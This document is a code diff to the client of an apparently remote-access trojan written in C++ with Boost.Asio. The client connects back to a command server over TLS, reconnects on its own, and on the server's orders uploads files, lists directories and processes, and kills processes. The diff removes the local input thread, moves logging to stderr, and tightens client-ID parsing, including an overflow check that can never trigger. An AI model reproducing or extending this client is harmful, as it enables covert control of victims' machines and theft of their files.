@@ -45,7 +45,7 @@ namespace Rat
     {
         initClientID();
         tryConnect();
-        input_thread_ = std::thread(&Client::handleUserInput, this);
+        // input_thread_ = std::thread(&Client::handleUserInput, this);
         networkManager_.get_io_context().run();
     }
 
@@ -54,7 +54,7 @@ namespace Rat
         stopping_ = true;
         networkManager_.get_io_context().stop();
         if (socket_) socket_->lowest_layer().close();
-        if (input_thread_.joinable()) input_thread_.join();
+        // if (input_thread_.joinable()) input_thread_.join();
     }
 
     void Client::initClientID(const std::string& path) 
@@ -62,18 +62,27 @@ namespace Rat
         std::fstream file(path, std::ios::in | std::ios::out | std::ios::app);
         if (!file.is_open()) 
         {
-            std::cout << "Cannot open file: " << path << "\n";
+            std::cerr << "Cannot open file: " << path << "\n";
             return;
         }
         std::string client_id;
         std::getline(file, client_id);
-        try 
-        {
-            this_id_ = std::stol(client_id);
+        if (!client_id.empty() && std::all_of(client_id.begin(), client_id.end(), ::isdigit)) {
+            try 
+            {
+                this_id_ = std::stoull(client_id);
+                if (this_id_ > std::numeric_limits<uint64_t>::max()) {
+                    this_id_ = -1; 
+                }
+            } 
+            catch (const std::exception& e) 
+            {
+                this_id_ = -1;
+            }
         } 
-        catch (const std::exception& e) 
+        else 
         {
-            // std::cout << "Invalid ID: " << e.what() << "\n";
+            this_id_ = -1;
         }
         file.close();
     }
@@ -85,7 +94,7 @@ namespace Rat
         {
             socket_->lowest_layer().close();
             socket_.reset();
-            // std::cout << "Debug: Closed previous socket\n";
+            // std::cerr << "Debug: Closed previous socket\n";
         }
         socket_ = std::make_shared<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>>(
             networkManager_.get_io_context(), networkManager_.get_ssl_context());
@@ -103,20 +112,20 @@ namespace Rat
                         {
                             if (!ec) 
                             {
-                                std::cout << "Connected to server: " << host_ << ":" << port_ << "\n";
+                                std::cerr << "Connected to server: " << host_ << ":" << port_ << "\n";
                                 sendClientId();
                                 handleCommands();
                             } 
                             else 
                             {
-                                std::cout << "Handshake error: " << ec.message() << "\n";
+                                std::cerr << "Handshake error: " << ec.message() << "\n";
                                 scheduleReconnect();
                             }
                         });
                 } 
                 else 
                 {
-                    std::cout << "Connection error: " << ec.message() << "\n";
+                    std::cerr << "Connection error: " << ec.message() << "\n";
                     scheduleReconnect();
                 }
             });
@@ -124,42 +133,49 @@ namespace Rat
 
     void Client::sendClientId() 
     {
+        std::random_device rd;
+        std::mt19937 gen(rd());
+        std::uniform_int_distribution<> dis(0, 999999);
         if (this_id_ == uint64_t(-1)) 
         {
             rat::Packet packet;
             packet.set_type(rat::Packet::STATIC_ID);
-            packet.set_packet_id("client_-1_" + std::to_string(std::rand()));
+            std::string packet_id = "client_-1_" + std::to_string(dis(gen));
+            packet.set_packet_id(packet_id.substr(0, 50)); 
             packet.set_source_id("client_-1");
             packet.set_destination_id("server_0");
             packet.set_encrypted(true);
             auto* chunked = packet.mutable_chunked_data();
-            chunked->set_data_id("STATIC_ID_" + Utils::getCurrentTimeString() + std::to_string(std::rand()));
+            std::string data_id = "STATIC_ID_" + Utils::getCurrentTimeString().substr(0, 30) + std::to_string(dis(gen));
+            chunked->set_data_id(data_id.substr(0, 100)); 
             chunked->set_sequence_number(0);
             chunked->set_total_chunks(1);
             chunked->set_payload("-1");
             chunked->set_success(true);
             networkManager_.send(socket_, packet, [](const boost::system::error_code& ec) 
             {
-                if (ec) std::cout << "Send error: " << ec.message() << "\n";
+                if (ec) std::cerr << "Send error: " << ec.message() << "\n";
             });
         } 
         else 
         {
             rat::Packet packet;
             packet.set_type(rat::Packet::STATIC_ID);
-            packet.set_packet_id("client_" + std::to_string(this_id_) + "_" + std::to_string(std::rand()));
+            std::string packet_id = "client_" + std::to_string(this_id_) + "_" + std::to_string(dis(gen));
+            packet.set_packet_id(packet_id.substr(0, 50));
             packet.set_source_id("client_" + std::to_string(this_id_));
             packet.set_destination_id("server_0");
             packet.set_encrypted(true);
             auto* chunked = packet.mutable_chunked_data();
-            chunked->set_data_id("STATIC_ID_" + Utils::getCurrentTimeString() + std::to_string(std::rand()));
+            std::string data_id = "STATIC_ID_" + Utils::getCurrentTimeString().substr(0, 30) + std::to_string(dis(gen));
+            chunked->set_data_id(data_id.substr(0, 100));
             chunked->set_sequence_number(0);
             chunked->set_total_chunks(1);
             chunked->set_payload(std::to_string(this_id_));
             chunked->set_success(true);
             networkManager_.send(socket_, packet, [](const boost::system::error_code& ec) 
             {
-                if (ec) std::cout << "Send error: " << ec.message() << "\n";
+                if (ec) std::cerr << "Send error: " << ec.message() << "\n";
             });
         }
     }
@@ -171,14 +187,14 @@ namespace Rat
         {
             socket_->lowest_layer().close();
             socket_.reset();
-            // std::cout << "Debug: Closed socket for reconnect\n";
+            // std::cerr << "Debug: Closed socket for reconnect\n";
         }
         timer_.expires_from_now(boost::posix_time::seconds(5));
         timer_.async_wait([this](const boost::system::error_code& ec) 
         {
             if (!ec && !stopping_) 
             {
-                std::cout << "Retrying connection to server...\n";
+                std::cerr << "Retrying connection to server...\n";
                 tryConnect();
             }
         });
@@ -207,56 +223,70 @@ namespace Rat
                         {
                             current_file_folder_sender_.reset();
                         }
-                        if (socket_) 
+                        if (socket_ && !stopping_) 
                         {
                             socket_->lowest_layer().close();
                             socket_.reset(); 
                         }
-                        scheduleReconnect();
+                        if (!stopping_) {
+                            scheduleReconnect();
+                        }
                         return;
                     } 
                     else 
                     {
                         std::cout << "[" << std::time(nullptr) << "] Receive error: " << ec.message() << "\n";
-                        if (socket_) 
+                        if (socket_ && !stopping_) 
                         {
                             socket_->lowest_layer().close();
                             socket_.reset(); 
                         }
-                        scheduleReconnect();
+                        if (!stopping_) {
+                            scheduleReconnect();
+                        }
                         return;
                     }
                 }
                 if (packet.has_chunked_data()) 
                 {
-                    // std::cout << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
-                    //         std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
+                    // std::cerr << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
+                    //         std::cerr << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
                     switch (packet.type())
                     {
                         case rat::Packet::STATIC_ID:
                         {
                             try 
                             {
-                                this_id_ = std::stol(packet.chunked_data().payload());
-                                std::ofstream file("client_id.txt");
-                                if (file.is_open()) 
+                                std::string payload = packet.chunked_data().payload();
+                                if (!payload.empty() && std::all_of(payload.begin(), payload.end(), ::isdigit)) {
+                                    this_id_ = std::stoull(payload);
+                                    if (this_id_ > std::numeric_limits<uint64_t>::max()) {
+                                        this_id_ = -1;
+                                    }
+                                    std::ofstream file("client_id.txt");
+                                    if (file.is_open()) 
+                                    {
+                                        file << this_id_ << "\n";
+                                        file.close();
+                                    }
+                                } 
+                                else 
                                 {
-                                    file << this_id_ << "\n";
-                                    file.close();
+                                    this_id_ = -1;
                                 }
                             } 
                             catch (const std::exception& e) 
                             {
-                                // std::cout << "Invalid ID: " << e.what() << "\n";
+                                this_id_ = -1;
                             }
                             boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                             break;
                         }
                         case rat::Packet::TRANSFER_FILE:
                         {
-                            std::cout << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
-                            std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
-                            std::cout << "COMMAND FILE PATH FROM SERVER: " << packet.file_path() << std::endl;
+                            std::cerr << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
+                            std::cerr << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
+                            std::cerr << "COMMAND FILE PATH FROM SERVER: " << packet.file_path() << std::endl;
                             std::ifstream test_file(packet.file_path(), std::ios::binary);
                             if (!test_file.is_open()) 
                             {
@@ -285,12 +315,12 @@ namespace Rat
                                 packet.file_path(),
                                 Utils::getCurrentTimeString() + std::to_string(this_id_),
                                 [this]() {
-                                    std::cout << "File transfer completed.\n";
+                                    std::cerr << "File transfer completed.\n";
                                     handleCommands();
                                     // boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                                 },
                                 [this]() {
-                                    std::cout << "Connection lost during file transfer, scheduling reconnect...\n";
+                                    std::cerr << "Connection lost during file transfer, scheduling reconnect...\n";
                                    if (current_file_sender_) 
                                     {
                                         current_file_sender_.reset();
@@ -308,8 +338,8 @@ namespace Rat
                         }
                         case rat::Packet::LIST_FILES_FOLDERS:
                         {    
-                            std::cout << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
-                            std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
+                            std::cerr << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
+                            std::cerr << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
                             // note check if path/level = packet.chunked_data().payload() not ok before listFilesFolders 
                             std::string response_list_files_folders = "LIST FILES AND FOLDER | SUCCESS";
                             std::string file_folder_data = FileFolderUtils::listFilesFolders(packet.chunked_data().payload(), response_list_files_folders); 
@@ -329,24 +359,24 @@ namespace Rat
                                 chunk->set_success(false);
                                 networkManager_.send(socket_, packet_list_files_folders, [](const boost::system::error_code& ec) 
                                 {
-                                    if (ec) std::cout << "Send error: " << ec.message() << "\n";
+                                    if (ec) std::cerr << "Send error: " << ec.message() << "\n";
                                 });
                                 boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                                 return;
                             }
-                            std::cout << "Debug size of file/folder list: " << file_folder_data.size() << std::endl;
+                            std::cerr << "Debug size of file/folder list: " << file_folder_data.size() << std::endl;
 
                             current_file_folder_sender_ = std::make_shared<FileFolderSender>(socket_, networkManager_, this_id_, file_folder_data);
                             current_file_folder_sender_->sendFileFolders(
                                 "LIST_FILES_FOLDERS_" + Utils::getCurrentTimeString() + std::to_string(this_id_),
                                 [this]()
                                 {
-                                    std::cout << "File/folder list transfer completed.\n";
+                                    std::cerr << "File/folder list transfer completed.\n";
                                     handleCommands();
                                 },
                                 [this]()
                                 {
-                                    std::cout << "Connection lost during file/folder transfer, scheduling reconnect...\n";
+                                    std::cerr << "Connection lost during file/folder transfer, scheduling reconnect...\n";
                                     if (current_file_folder_sender_)
                                     {
                                         current_file_folder_sender_.reset();
@@ -363,23 +393,23 @@ namespace Rat
                         }
                         case rat::Packet::LIST_PROCESSES:
                         {  
-                            std::cout << "COMMAND TYPE FROM SERVER: " << packet.type() << std::endl;
-                            std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
+                            std::cerr << "COMMAND TYPE FROM SERVER: " << packet.type() << std::endl;
+                            std::cerr << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
 
                             // Get process list
                             std::string process_data = formatProcessList(listProcesses());
-                            std::cout << "Debug size: " << process_data << std::endl;
+                            std::cerr << "Debug size: " << process_data << std::endl;
                             current_process_sender_ = std::make_shared<ProcessSender>(socket_, networkManager_, this_id_, process_data);
                             current_process_sender_->sendProcesses(
                                 "LIST_PROCESS_" + Utils::getCurrentTimeString() + std::to_string(this_id_),
                                 [this]()
                                 {
-                                    std::cout << "Process list transfer completed.\n";
+                                    std::cerr << "Process list transfer completed.\n";
                                     handleCommands();
                                 },
                                 [this]()
                                 {
-                                    std::cout << "Connection lost during process transfer, scheduling reconnect...\n";
+                                    std::cerr << "Connection lost during process transfer, scheduling reconnect...\n";
                                     if (current_process_sender_)
                                     {
                                         current_process_sender_.reset();
@@ -401,7 +431,7 @@ namespace Rat
                             auto pid = -1;
                             try 
                             {
-                                pid = std::stol(packet.chunked_data().payload());
+                                pid = std::stoi(packet.chunked_data().payload());
                             } 
                             catch (const std::exception& e) 
                             {
@@ -424,7 +454,7 @@ namespace Rat
                                 chunk->set_success(true);
                                 networkManager_.send(socket_, packet_kill_process, [](const boost::system::error_code& ec) 
                                 {
-                                    if (ec) std::cout << "Send error: " << ec.message() << "\n";
+                                    if (ec) std::cerr << "Send error: " << ec.message() << "\n";
                                 });
                                 boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                                 return;
@@ -432,7 +462,7 @@ namespace Rat
                             
                             if (kill(pid, SIGKILL) == 0) 
                             {
-                                std::cout << "Process " << pid << " is killed.\n";
+                                std::cerr << "Process " << pid << " is killed.\n";
                             } 
                             else 
                             {
@@ -443,7 +473,7 @@ namespace Rat
                             chunk->set_success(true);
                             networkManager_.send(socket_, packet_kill_process, [](const boost::system::error_code& ec) 
                             {
-                                if (ec) std::cout << "Send error: " << ec.message() << "\n";
+                                if (ec) std::cerr << "Send error: " << ec.message() << "\n";
                             });                            
                             boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                             break;
@@ -495,7 +525,7 @@ namespace Rat
 
             networkManager_.send(socket_, packet, [](const boost::system::error_code& ec) 
             {
-                if (ec) std::cout << "Send error: " << ec.message() << "\n";
+                if (ec) std::cerr << "Send error: " << ec.message() << "\n";
             });
         }
     }
